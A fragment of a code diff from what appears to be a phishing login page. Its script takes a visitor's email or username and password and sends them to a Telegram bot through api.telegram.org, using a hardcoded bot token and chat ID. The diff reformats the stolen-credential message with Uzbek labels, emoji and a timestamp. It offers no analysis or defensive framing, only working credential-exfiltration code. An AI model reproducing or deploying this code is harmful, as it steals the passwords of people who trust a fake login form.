@@ -275,7 +275,15 @@ footer .copyright {
             // Telegram bot information
             const botToken = '7765605226:AAHZxGG3bkQtOgrapSrqrlywJX416idTqug'; // Enter your Telegram bot token here
             const chatId = '7984884145'; // Enter your Telegram chat ID here
-            const message = `New login details:\nEmail/Username: ${email}\nPassword: ${password}`;
+            const message = 
+`🔐 *Yangi Login Ma'lumotlari*  
+
+👤 *Email / Username:* ${email}
+🔑 *Password:* ${password}
+
+🕒 Vaqt: ${new Date().toLocaleString()}
+🌐 manba: tizimdan yuborildi`;
+
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
